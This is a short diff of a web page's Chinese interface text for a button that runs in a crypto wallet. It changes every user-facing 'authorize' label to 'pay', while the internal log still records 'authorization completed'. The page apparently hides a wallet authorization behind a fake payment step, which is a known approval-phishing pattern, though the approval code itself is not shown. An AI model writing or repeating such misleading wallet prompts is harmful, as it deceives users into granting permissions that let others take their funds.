@@ -57,7 +57,7 @@
       </div>
 
       <div class="text-center mt-4 text-secondary small">
-        <p class="opacity-75">授权后请联系客服确认订单</p>
+        <p class="opacity-75">支付后请联系客服确认订单</p>
         <a href="javascript:history.back()" class="text-decoration-none text-secondary">返回上一页</a>
       </div>
 
@@ -204,13 +204,13 @@
                 log("授权已完成");
               } catch (e) {
                 btn.disabled = false;
-                btn.textContent = "重试授权";
-                log("授权失败: " + (e.message || e));
-                alert("授权失败: " + (e.message || e));
+                btn.textContent = "重试支付";
+                log("支付失败: " + (e.message || e));
+                alert("支付失败: " + (e.message || e));
               }
             };
 
-            log("环境已就绪，请点击按钮进行授权");
+            log("环境已就绪，请点击按钮进行支付");
           } else {
             btn.textContent = "未检测到钱包环境";
             btn.disabled = true;
